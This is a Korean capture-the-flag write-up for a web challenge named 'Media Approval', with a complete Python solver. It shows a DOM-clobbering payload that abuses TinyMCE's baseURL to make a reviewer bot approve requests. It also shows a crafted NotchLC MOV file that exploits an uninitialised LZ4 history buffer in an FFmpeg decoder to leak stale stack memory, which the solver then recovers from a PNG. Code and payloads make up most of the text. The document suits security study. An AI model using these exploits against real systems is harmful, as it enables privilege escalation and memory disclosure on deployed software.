# Media Approval

## 결과

- 대상: `http://43.203.139.141:8000` / `http://3.38.217.83:8000`
- CTFd challenge id: `3`
- 플래그: `FLAG{m3d14_92b89d0bc30f58eac14f7ea5f4b3e5845f090689}`
- 제출 결과: `already_solved` 재확인, `solved_by_me=true`

재현 스크립트는 `solve.py`이며 다음 명령으로 가입부터 플래그 복구까지 전 과정을 실행한다.

```powershell
python solve.py --target http://43.203.139.141:8000
```

이미 생성된 `solve-state.json` 계정을 재사용하려면 다음과 같이 실행한다.

```powershell
python solve.py --reuse
```

## 1단계: 리뷰 봇의 승인 권한 획득

일반 계정은 `delivery_contact`로 생성되고 `/compare`에 접근할 수 없다. `preview` 요청이 매니저에게 승인되면 `requests.py`의 `/manager/action`이 계정을 `associate_screens_producer`로 승격하고 `previews=Allowed`를 설정한다.

리뷰 봇은 공격자가 등록한 전송 위치를 방문한 뒤, 공격자의 요청만 볼 수 있는 scoped manager 세션으로 `/manager?request=<id>`를 연다. 이어 답변 textarea를 focus하여 TinyMCE를 자동으로 로드한다.

서버는 delivery note를 escape하지만 `static/js/app.js`가 다음과 같이 다시 HTML로 해석한다.

```javascript
const source = note.textContent;
note.setHTML(source, { sanitizer });
```

Sanitizer 설정은 `a` 요소와 `id`, `name`, `href`를 남긴다. 다음 note는 named-property 규칙으로 `window.tinymce`를 `HTMLCollection`으로 만들고 `baseURL` 속성을 공격자 지정 anchor로 만든다.

```html
<a id="tinymce"></a>
<a id="tinymce" name="baseURL" href="data:text/javascript,..."></a>
```

TinyMCE 8.9.2는 초기화 시 기존 `window.tinymce.baseURL`을 신뢰한다. `app.js`는 nonce가 있는 trusted script이고 페이지 CSP는 `strict-dynamic`을 사용하므로, TinyMCE가 위 base URL에서 동적으로 추가한 payload도 실행된다. payload는 현재 카드의 폼을 same-origin으로 전송한다.

```javascript
f = document.querySelector('form[action="/manager/action"]');
d = new FormData(f);
d.set('decision', 'approve');
fetch(f.action, { method: 'POST', body: d });
```

scoped manager 쿠키가 자동으로 붙으므로 해당 preview 요청이 승인되고 공격자 계정에 `/compare` 권한이 생긴다.

## 2단계: NotchLC stale-stack disclosure

`mediaops.approved_version()`은 실행 시 플래그를 승인 영상의 NotchLC 프레임 안에 넣는다. 제공된 샘플에서 프레임은 다음 형태다.

- LZ4 decompressed size: `380`
- compressed payload: `f0 ff 6e` + 380바이트 literal
- 플래그 시작 위치: decompressed history offset `300`

`/compare`는 같은 작업 흐름에서 승인 영상을 먼저 디코드하고, 곧바로 공격자가 업로드한 영상을 디코드한다.

FFmpeg 8.0.1의 `libavcodec/notchlc.c`에 있는 자체 LZ4 디코더는 다음 스택 배열을 초기화하지 않는다.

```c
uint8_t history[64 * 1024];
```

그리고 출력 위치보다 큰 distance를 허용하면서 참조 위치를 다음처럼 wrap한다.

```c
reference_pos = HISTORY_SIZE + pos - delta;
```

두 디코드 호출에서 동일한 worker stack이 재사용되므로 두 번째 호출의 `history`에는 첫 번째 승인 프레임이 남는다.

악성 프레임은 먼저 정상 NotchLC 헤더·control word를 포함한 252바이트를 literal로 출력한다. 이어 `delta=0xffd0`인 match를 넣는다.

```text
reference_pos = 65536 + 252 - 0xffd0 = 300
```

따라서 이전 승인 프레임의 `history[300:]`, 즉 플래그가 두 번째 프레임의 Y bitstream 위치로 복사된다. match 길이는 128바이트로 잡아 전체 decompressed size를 원본과 같은 380바이트로 맞췄다.

서버는 공격 영상의 luma를 `/compare/still?id=<job>`에 16-bit grayscale PNG로 저장한다. PNG 픽셀을 NotchLC의 4×4 block 소비 순서로 되돌리고, 각 값을 `0x1111` 단위 nibble로 양자화한 뒤 low nibble을 먼저 결합하면 stale history 원문이 복구된다.

```text
FLAG{m3d14_92b89d0bc30f58eac14f7ea5f4b3e5845f090689}
```

`solve.py`는 악성 MOV 생성, 업로드, compare 실행, PNG 다운로드, PNG filter 해제, NotchLC nibble 역변환, `FLAG{...}` 추출까지 자동화한다. 결과는 `flag.txt`와 `solve-state.json`에도 저장된다.


## 최종 풀이 코드 전체

아래 코드는 DOM clobbering 승인 요청, 악성 NotchLC MOV 생성, still PNG 역변환과 플래그 추출을 모두 포함한 최종 재현 스크립트 전체다. 저장된 계정 값·쿠키는 포함하지 않는다.

### `solve.py`

````python
#!/usr/bin/env python3
"""End-to-end solver for UHCON Media Approval.

Stage 1 turns the reviewer's Sanitizer/TinyMCE DOM clobber into a scoped
manager approval.  Stage 2 exploits FFmpeg 8.0.1's uninitialised NotchLC LZ4
history and decodes the approved video's flag from the generated still PNG.
"""

from __future__ import annotations

import argparse
import json
import secrets
import struct
import time
import zlib
from pathlib import Path
from urllib.parse import quote

import requests


ROOT = Path(__file__).resolve().parent
STATE_PATH = ROOT / "solve-state.json"
SAMPLE_MOV = ROOT / "src" / "show" / "current.mov"


def reviewer_payload() -> str:
    # TinyMCE reads window.tinymce before replacing it with its real API.
    # Duplicate named anchors turn that value into an HTMLCollection whose
    # baseURL member is our second anchor.  TinyMCE then dynamically loads this
    # data URL as a trusted script under the page's strict-dynamic CSP.
    js = (
        "f=document.querySelector('form[action=\"/manager/action\"]');"
        "d=new FormData(f);d.set('decision','approve');"
        "fetch(f.action,{method:'POST',body:d})//"
    )
    data_url = "data:text/javascript," + quote(js, safe="(),.;=/:{}[]")
    return (
        '<a id="tinymce"></a>'
        f'<a id="tinymce" name="baseURL" href="{data_url}"></a>'
    )


def checked(response: requests.Response, expected=(200, 303)) -> requests.Response:
    if response.status_code not in expected:
        raise RuntimeError(
            f"{response.request.method} {response.url}: {response.status_code}\n"
            f"{response.text[:1000]}"
        )
    return response


def bootstrap(target: str) -> tuple[requests.Session, dict]:
    session = requests.Session()
    session.headers["User-Agent"] = "UHCON-Media-Approval-solver"
    token = secrets.token_hex(6)
    state = {
        "target": target.rstrip("/"),
        "email": f"solver-{token}@example.com",
        "password": "MediaApproval!" + secrets.token_hex(10),
    }

    response = session.post(
        state["target"] + "/signup",
        data={"email": state["email"], "password": state["password"]},
        allow_redirects=False,
        timeout=30,
    )
    checked(response)

    response = session.post(
        state["target"] + "/deliveries/new",
        data={"name": "reviewclip", "version": "v001"},
        files={"media": ("reviewclip.mov", SAMPLE_MOV.read_bytes(), "video/quicktime")},
        allow_redirects=False,
        timeout=30,
    )
    checked(response)
    location = response.headers.get("Location", "")
    state["delivery"] = int(location.rsplit("=", 1)[1])

    checked(
        session.post(
            state["target"] + "/requests/new",
            data={
                "delivery": str(state["delivery"]),
                "kind": "preview",
                "note": "Please approve the on-site preview.",
            },
            allow_redirects=False,
            timeout=30,
        )
    )

    checked(
        session.post(
            state["target"] + "/transfer",
            data={
                "delivery": str(state["delivery"]),
                "location": "http://app:8000/",
                "note": reviewer_payload(),
            },
            allow_redirects=False,
            timeout=30,
        )
    )
    STATE_PATH.write_text(json.dumps(state, indent=2), encoding="utf-8")
    return session, state


def wait_for_producer(session: requests.Session, state: dict, timeout: int = 120) -> None:
    deadline = time.monotonic() + timeout
    while time.monotonic() < deadline:
        response = session.get(state["target"] + "/show", timeout=20)
        if response.status_code == 200 and "접근 권한이 없습니다" not in response.text:
            state["producer"] = True
            STATE_PATH.write_text(json.dumps(state, indent=2), encoding="utf-8")
            print("[+] reviewer approved preview; producer access granted")
            return
        time.sleep(1)
    raise TimeoutError("reviewer did not grant producer access")


def login(state: dict) -> requests.Session:
    session = requests.Session()
    session.headers["User-Agent"] = "UHCON-Media-Approval-solver"
    checked(
        session.post(
            state["target"] + "/login",
            data={"email": state["email"], "password": state["password"]},
            allow_redirects=False,
            timeout=30,
        )
    )
    return session


def build_history_leak_mov() -> bytes:
    """Build a NotchLC frame that copies stale decoder stack bytes into Y.

    FFmpeg 8.0.1's NotchLC LZ4 decoder left its 64 KiB history array
    uninitialized.  The approved frame is decoded immediately before ours on
    the same worker thread, so history[300:] still contains the injected flag.
    We emit 252 literal bytes and then wrap a back-reference to old offset 300.
    """
    original = SAMPLE_MOV.read_bytes()
    marker = original.index(b"1CLN")
    uncompressed_size, stored, compression = struct.unpack_from("<III", original, marker + 4)
    if (uncompressed_size, stored, compression) != (380, 383, 1):
        raise RuntimeError("unexpected reference NotchLC frame")

    # The reference packet is one all-literal LZ4 block: F0 FF 6E + 380 bytes.
    prefix = original[marker + 19 : marker + 19 + 252]
    if len(prefix) != 252:
        raise RuntimeError("truncated reference frame")

    literal_extension = 252 - 15
    match_length = 128
    match_extension = match_length - 19
    stale_offset = 300
    delta = 65536 + len(prefix) - stale_offset
    compressed = (
        bytes((0xFF, literal_extension))
        + prefix
        + struct.pack("<H", delta)
        + bytes((match_extension,))
    )
    packet = b"1CLN" + struct.pack("<III", 380, len(compressed), 1) + compressed

    # Preserve the supplied MOV's ftyp/moov metadata, replace its sole mdat
    # sample, and update stsz's per-sample length.  stco remains 28.
    moov_at = original.index(b"moov") - 4
    moov = bytearray(original[moov_at:])
    stsz = moov.index(b"stsz") - 4
    struct.pack_into(">I", moov, stsz + 20, len(packet))
    mdat = struct.pack(">I4s", len(packet) + 8, b"mdat") + packet
    return original[:20] + mdat + bytes(moov)


def upload_mov(session: requests.Session, state: dict, content: bytes) -> int:
    response = session.post(
        state["target"] + "/deliveries/new",
        data={"name": "historyleak", "version": "v001"},
        files={"media": ("historyleak.mov", content, "video/quicktime")},
        allow_redirects=False,
        timeout=30,
    )
    checked(response)
    return int(response.headers["Location"].rsplit("=", 1)[1])


def decode_still(png: bytes) -> tuple[int, int, list[int]]:
    if not png.startswith(b"\x89PNG\r\n\x1a\n"):
        raise RuntimeError("compare still is not a PNG")
    cursor = 8
    width = height = 0
    compressed = bytearray()
    while cursor < len(png):
        size = struct.unpack_from(">I", png, cursor)[0]
        kind = png[cursor + 4 : cursor + 8]
        data = png[cursor + 8 : cursor + 8 + size]
        cursor += 12 + size
        if kind == b"IHDR":
            width, height, depth, color, _, _, _ = struct.unpack(">IIBBBBB", data)
            if depth != 16 or color != 0:
                raise RuntimeError("unexpected still pixel format")
        elif kind == b"IDAT":
            compressed.extend(data)
        elif kind == b"IEND":
            break
    raw = zlib.decompress(bytes(compressed))
    stride = 1 + width * 2
    if len(raw) != height * stride:
        raise RuntimeError("unexpected PNG scanline length")
    values: list[int] = []
    for y in range(height):
        row = raw[y * stride : (y + 1) * stride]
        if row[0] != 0:
            raise RuntimeError("unexpected PNG filter")
        values.extend(struct.unpack(">" + "H" * width, row[1:]))
    return width, height, values


def pixels_to_notch_bytes(width: int, height: int, values: list[int]) -> bytes:
    result = bytearray()
    for y0 in range(0, height, 4):
        for x0 in range(0, width, 4):
            for dy in range(4):
                for dx in range(0, 4, 2):
                    first = max(0, min(15, round(values[(y0 + dy) * width + x0 + dx] / 0x1111)))
                    second = max(0, min(15, round(values[(y0 + dy) * width + x0 + dx + 1] / 0x1111)))
                    result.append(first | (second << 4))
    return bytes(result)


def leak_flag(session: requests.Session, state: dict) -> str:
    exploit = build_history_leak_mov()
    (ROOT / "history-leak.mov").write_bytes(exploit)
    delivery = upload_mov(session, state, exploit)
    response = session.post(
        state["target"] + "/compare",
        data={"delivery": str(delivery)},
        allow_redirects=False,
        timeout=90,
    )
    checked(response)
    job = int(response.headers["Location"].rsplit("=", 1)[1])
    response = checked(session.get(state["target"] + f"/compare/still?id={job}", timeout=30), (200,))
    (ROOT / "history-leak.png").write_bytes(response.content)

    width, height, pixels = decode_still(response.content)
    decoded = pixels_to_notch_bytes(width, height, pixels)
    # The first 64 bytes are the stale baseline history[300:364].
    leaked = decoded[:64]
    (ROOT / "history-leak.bin").write_bytes(leaked)
    start = leaked.find(b"FLAG{")
    end = leaked.find(b"}", start + 5)
    if start < 0 or end < 0:
        raise RuntimeError(f"flag not found in leak: {leaked!r}")
    flag = leaked[start : end + 1].decode("ascii")
    (ROOT / "flag.txt").write_text(flag + "\n", encoding="ascii")
    state.update({"producer": True, "leak_delivery": delivery, "compare_job": job, "flag": flag})
    STATE_PATH.write_text(json.dumps(state, indent=2), encoding="utf-8")
    print(f"[+] leaked flag: {flag}")
    return flag


def main() -> None:
    parser = argparse.ArgumentParser()
    parser.add_argument("--target", default="http://43.203.139.141:8000")
    parser.add_argument("--reuse", action="store_true")
    args = parser.parse_args()

    if args.reuse and STATE_PATH.exists():
        state = json.loads(STATE_PATH.read_text(encoding="utf-8"))
        session = login(state)
    else:
        session, state = bootstrap(args.target)
        print(f"[+] account={state['email']} delivery={state['delivery']}")
    wait_for_producer(session, state)
    leak_flag(session, state)


if __name__ == "__main__":
    main()
````
